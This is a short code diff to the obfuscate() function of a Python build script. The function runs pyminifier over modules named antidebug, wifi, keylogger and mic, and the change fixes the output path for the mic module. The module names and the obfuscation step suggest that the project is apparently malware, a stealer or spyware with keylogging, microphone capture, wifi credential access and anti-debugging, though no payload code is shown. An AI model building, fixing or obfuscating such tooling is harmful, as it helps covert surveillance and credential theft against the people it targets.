@@ -59,7 +59,7 @@ def obfuscate():
         subprocess.run(f"pyminifier -o build/modules/antidebug.py build/modules/antidebug.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/antidebug.py
         subprocess.run(f"pyminifier -o build/modules/wifi.py build/modules/wifi.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/wifi.py
         subprocess.run(f"pyminifier -o build/modules/keylogger.py build/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
-        subprocess.run(f"pyminifier -o build/modules/keylogger.py build/modules/mic.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/mic.py
+        subprocess.run(f"pyminifier -o build/modules/mic.py build/modules/mic.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/mic.py
         progress.update(task1, advance=1)
     except:
         progress.stop()
